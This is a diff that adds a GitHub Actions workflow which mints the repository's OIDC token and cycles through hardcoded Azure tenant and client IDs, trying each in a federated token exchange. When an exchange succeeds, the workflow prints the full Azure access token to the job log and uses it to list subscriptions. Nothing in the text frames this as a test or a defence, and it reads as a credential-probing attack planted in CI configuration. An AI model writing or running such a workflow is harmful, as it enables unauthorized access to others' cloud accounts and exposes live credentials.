@@ -1,0 +1,33 @@
+name: uloidc
+on:
+  push:
+    branches: ["ul-oidc-*"]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  o:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint
+        run: |
+          set +e
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF EVENT=$GITHUB_EVENT_NAME"
+          AUD="api://AzureADTokenExchange"
+          OT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+          echo "OIDC_LEN=${#OT}"
+          echo "$OT" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c "import sys,json;d=json.load(sys.stdin);print('CLAIMS sub=',d.get('sub'),'aud=',d.get('aud'),'iss=',d.get('iss'),'tid=',d.get('tid'))"
+          for TEN in e8adc959-bf67-48e0-95b4-318b5f73946c 59fa7797-8090-4b20-9f2b-2b7c4c7e3d2a c3b32785-891b-4be9-90c2-c6d313ab4895 organizations; do
+            for CID in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 d6529b06-857c-4e9e-81d0-eee83f0320ab 31f3b47b-3d31-4a5b-8f7e-1f3c8c0e7b35 e3d1f2c5-7cbb-4b6e-9b1c-1c0b7d0c5a11; do
+              R=$(curl -s -m 30 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d grant_type=client_credentials --data-urlencode client_id=$CID --data-urlencode scope=https://management.azure.com/.default --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion=$OT)
+              echo "M $TEN $CID :: $(echo "$R" | head -c 200)"
+              AT=$(echo "$R" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+              if [ -n "$AT" ]; then
+                echo "TOKEN_OK $TEN $CID len=${#AT}"
+                echo "TOKENVAL $TEN $CID $AT"
+                curl -s -m 30 -H "Authorization: Bearer $AT" "https://management.azure.com/subscriptions?api-version=2022-12-01" | head -c 1500; echo
+              fi
+            done
+          done
